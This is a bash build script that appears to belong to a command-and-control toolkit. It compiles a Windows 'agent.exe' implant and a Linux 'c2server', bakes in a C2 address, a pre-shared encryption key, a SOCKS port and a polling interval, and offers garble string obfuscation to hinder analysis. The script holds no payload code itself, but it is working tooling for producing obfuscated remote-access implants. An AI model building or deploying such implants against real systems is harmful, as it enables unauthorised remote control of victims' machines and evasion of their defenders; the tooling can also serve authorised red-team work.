#!/usr/bin/env bash
# build.sh – convenience wrapper around the Makefile.
#
# Usage:
#   ./build.sh                                    # both binaries, default settings
#   ./build.sh --c2 2001:db8::1                   # bake C2 address into both binaries
#   ./build.sh --c2 2001:db8::1 --psk mysecret    # bake C2 + PSK encryption key
#   ./build.sh --garble                           # garble obfuscation (requires garble in $PATH)
#   ./build.sh --garble --c2 <addr> --psk <key>  # garble + baked C2 + baked PSK
set -euo pipefail

C2=""
SPORT="1080"
POLL="50"
PSK=""
USE_GARBLE=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --c2)       C2="$2";     shift 2 ;;
        --port)     SPORT="$2";  shift 2 ;;
        --poll)     POLL="$2";   shift 2 ;;
        --psk)      PSK="$2";    shift 2 ;;
        --garble)   USE_GARBLE=1; shift ;;
        *) echo "Unknown option: $1" >&2; exit 1 ;;
    esac
done

mkdir -p dist

if [[ $USE_GARBLE -eq 1 ]]; then
    if ! command -v garble &>/dev/null; then
        echo "[*] Installing garble..."
        go install mvdan.cc/garble@latest
    fi
    echo "[*] Building with garble (full string obfuscation)..."
    LFLAGS="-X main.defaultC2=${C2} -X main.defaultSocksPort=${SPORT} -X main.defaultPollMs=${POLL} -X main.defaultPSK=${PSK}"
    GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags "$LFLAGS" -o dist/agent.exe  ./cmd/client
    GOOS=linux   GOARCH=amd64 garble -literals -tiny build -ldflags "$LFLAGS" -o dist/c2server   ./cmd/server
else
    if [[ -n "$C2" ]]; then
        echo "[*] Building with baked-in C2: $C2"
        make client-baked server-baked C2="$C2" SPORT="$SPORT" POLL="$POLL" PSK="$PSK"
    else
        echo "[*] Building with default settings (pass --c2 <addr> to bake in C2 address)"
        make client server
    fi
fi

echo ""
echo "[+] Build complete:"
ls -lh dist/
